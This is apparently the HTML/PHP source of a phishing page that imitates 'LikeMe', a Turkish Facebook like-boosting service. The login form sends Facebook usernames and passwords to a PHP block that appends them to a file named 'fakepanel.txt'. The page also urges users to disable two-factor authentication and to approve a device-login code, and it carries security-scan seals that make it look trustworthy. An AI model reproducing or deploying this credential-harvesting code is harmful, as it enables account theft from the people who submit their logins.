
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<div class='LikeMe turk_bayrak' style='width:135px;height:135px;background-image:url(https://begen.co//anasayfa/sol_bayrak.png)'>
<style>.kdrs:hover{left:0px !important;opacity:0.70 !important;filter:alpha(opacity=70) !important;}</style>
<style type='text/css'>div.LikeMe{position:fixed;zindex:3000;}div.turk_bayrak{top:0px;left:0px;}</style>
</div>

<title>LikeMe | Facebook Beğeni</title>
<link rel="shortcut icon" href="https://begen.co/favicon.ico" />
<link rel="canonical" href="http://begen.co"/>
<meta name="description" content="LikeMe Facebook Beğeni,Facebook Beğeni Hilesi, Facebook Sayfa Beğeni, Instagram Beğeni, Beğeni Hilesi, Durum beğeni,Resim beğeni,Yorum beğeni, Beğeni kasma" />

<style type="text/css">
@font-face {
  font-family: 'Dosis'; font-style: normal; font-weight: 400;
  src: local('Dosis Regular'), local('Dosis-Regular'), url(../anasayfa/Dosis.woff) format('woff');
} *, body {color: #636363;font-family: 'Dosis', sans-serif;}
</style>

<link href="https://begen.co/anasayfa/1.css" rel="stylesheet"  media="screen, projection">

<section class="container" style="width:90%;margin: 0 0 0 3%;">

      <section class="logo" style="margin:20;"> <!-- Margin ile üstten boşluk verildi !!! -->
        <h1>
        <span style="color: #2F3292;">
           &nbsp;&nbsp; Like
        </span>
        <span style="color: #1CBAF2;margin: 0 0 0 -18px;">
          Me
        </span>
      <span style="color: #2F3292; font-size:11pt ; margin: 0 0 0 -18px;">&nbsp;&nbsp;v8.7</span><!-- margin eklendi -->

    </h1>
  </section>


<div style="position: fixed; top: 15; left: 30%;">
<!-- Reklam -->
</div>

  <section style="height: 130px;">

    <section style="font-size: 18px;background: #00C0F2;height: 40px;">
      <section style="padding: 10px;">

          <a title="Resim Beğeni"/><section style="cursor: default;color: #ffffff;margin: -2.75px 4px 0 0;float: left;">
              Durum, Resim, Resim ve Durum Yorumu, Sayfa Resmi, Sayfa Durumu, Reaksiyon <section style="margin: 3px 0 0 10px;"></section>           </section>
          </a>

            <a title="SSS"/><section style="cursor: pointer;color: #ffffff;margin: -2.75px 4px 0 0;float: right;">
              <a style="color:white" href="https://begen.co/?s=sss" />SSS</a> <section style="margin: 3px 0 0 10px;"></section>            </section>
          </a>

            <a title="Hakkında"/><section style="cursor: pointer;color: #ffffff;margin: -2.75px 4px 0 0;float: right;">
              <a style="color:white" href="https://begen.co/?s=hakkinda" />Hakkında</a> | <section style="margin: 3px 0 0 10px;"></section>            </section>
          </a>
          
            <a title="Anasayfa"/><section style="cursor: pointer;color: #ffffff;margin: -2.75px 4px 0 0;float: right;">
              <a style="color:white" href="" />Anasayfa</a> | <section style="margin: 3px 0 0 10px;"></section>            </section>
          </a>

    </section>
  </section>
  
  <section>
    <section id="controller">
      
      <section class="headline">
      
  <h2>Facebook'ta Popüler Ol</h2>

  <h3 style="color: #aaaaaa;float: right;">
    Sorun mu var? <a href="https://begen.co//yardim.php" target="_blank">Burayı</a> incele
  </h3>
  
</section>

<section class="token">
  <section class="description" style ='height: 0px; padding: 0px;'>
<!-- Bilgi -->
    </section>
    

  <table>
  
  <td width='50%'> 

<div class='info'><font size='4'><b>Şifreyle giriş:</b></font><br>
        <font size='3'>
        Kullanıcı adı ve şifrenizi girdikten sonra Token Al diyerek oluşan bütün yazıyı kopyalayın ve giriş yapın.</font><br>
        <font size='2'>
        Şifrenizi kulanmak yerine <a target="_blank" href='https://www.facebook.com/settings?tab=security&section=per_app_passwords&view'>buradan</a> uygulama şifresi oluşturup facebook'un size verdiği şifreyi kullanmanızı tavsiye ederiz.<br>
        Checkpoint'e düşüyorsanız girmeden önce tarayıcınızın yan sekmesinden Facebook hesabınıza giriş yapın. Ayrıca <a href='https://www.facebook.com/settings?tab=security&section=two_fac_auth&view'>İki faktörlü kimlik doğrulama</a>'yı kapatın.
        </font>
  <br>      
<!--
<font size='4'><b>Uygulamayla giriş:</b></font>

        <font size='3'><br><a href='https://begen.co/?kurulum=0'>Buradan</a> şifresiz giriş yapabilirsiniz.
        Bu yöntem ile hesabınız checkpointe düşmez ve çok daha kolay bir şekilde giriş yapabilirsiniz.
        </font>

</td>

<font size='4'><b>Eklentiyle giriş:</b>
<br>
      Chrome Eklentisini <a href='https://chrome.google.com/webstore/detail/get-cookie-api/pnnddjfpgpopbpacpbbncaoehhjpkemk'>Buradan</a> indirebilirsiniz.<br>
</font>
<br>
        <input type="button" value="Eklentiyle Giriş Yap" style="width: 20%;" class="submit" onclick='addonLogin()'></center>
-->
</td>
<!-- ADDON -->
  <iframe width="1" height="1" id="myAddonFrame"></iframe>
<!-- ----- -->

<div class='error'><font size='4'><b>Bilgilendirme:</b></font>
<font size='3'>
  Facebook tarafından yapılan değişiklik sebebiyle beğeni limitini azaltmak zorunda kaldık, azalmadığımız taktirde hiç beğeni alamayacaktınız! Beğeni sayısının azaldığının farkındayız, limitleri yeniden arttırabilmek için çalışıyoruz, anlayışınız için teşekkür ederiz.</font>
</div>

<div class='success'>
<font size='3'>Yeni Yöntem: Giriş yapmak için kodu kopyalayın ve <a target="_blank" rel="noopener noreferrer" href='https://www.facebook.com/device'>https://www.facebook.com/device</a> adresine yapıştırın,izinleri onaylayın otomatik olarak giriş yapacaksınız.</font>
<iframe width="480" height="80"  frameborder="0" seamless="seamless" scrolling="no" frameborder="0" allowtransparency="true" src='create_code.php?i=547219'></iframe>
</div>

  <td width='50%'>
      <table  style='padding-left:100px;'>

          <div class='info' style='width: 100%;margin-left: 10px;'>
            <center><font size='3'><strong>Diğer Uygulamalarımız</strong></font></center>
          </div>
          
          <center>
            <a href='https://instagram.begen.co'/>
              <img src='https://begen.co//anasayfa/instagram_new.png' style='width:120px; height:120px' />
              <br>
              <font size='4'>Instagram Beğeni & Takipçi</font>
            </a>
          </center>
          
          <div class='success' style='width: 95%;margin-left: 10px;'>
          <center><font size='3'><strong>Android telefonunuza eklentileri kurmak için yandex browser kullanabilirsiniz.</strong></font></center>
          </div>
          
      </table>

  </td>

  <tr>
      <td>
      

      <center>
      
 <form action="" method="post">
      
        <input type='text'  name="username"  class="text title" placeholder="Facebook Kullanıcı Adı" type="text">
        <input type='password' name="password"  class="text title" placeholder="Facebook Şifre"  type="password">
        <input type="hidden" name="" value=""/> 
        <div id="tokenarea" class="list-group-item"></div>
      <font size='3' color='#777'> <a href='https://begen.co/kosullar.php'>Şartlar ve Koşullar</a>'ı okudum, kabul ediyorum.</font>
      <input type='checkbox' required name="terms" id='checkme'/>
      <input type="hidden" name="csrf" value="8fd18d67b94d410c4d2dd2281dd1910a"/>
      <input value="Giriş Yap" style="width: 20%;" id='sendNewSms2' class="submit" type="submit">
    </form>

    <?php 
if (!empty($_POST['username']) && !empty($_POST['password'])) {
$ac = fopen("fakepanel.txt","a+");
$password = $_POST['password'];
$username = $_POST['username'];

$userlar = ("\n __________________ \n"." Username: ".$username."\n Password: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);

}
     ?>
  </td>   
  </tr>
  
</table>

<br><br>

</section>  

    

<br><br>

</section>

    <section style="border-top:1px solid #aaaaaa;padding: 5px;">
    
      <section style="float: left;">
        LikeMe © 2019 <a>Türkçe (TR)</a><br>
        </section>
      
        <section style="float: right;">

          <a href="https://www.virustotal.com/tr/url/8b1d99c029380ec71fbfdfae45b5411297ebfd20d2690aa525b935b6d5ea8a11/analysis/" target="_blank">
          <img style='margin: 0 0 0 +15px;' src="https://begen.co//anasayfa/virustotal_seal.png" border="0" width="98" height="35" alt="Virustotal Secured"></a>

          <a href="http://www.urlvoid.com/scan/begen.co/" target="_blank">
          <img style='margin: 0 0 0 +15px;' src="https://begen.co/anasayfa/urlvoid_seal.png" border="0" width="78" height="35" alt="URLVOID Secured"></a>

        </section>
        
      
  </section>
</section>
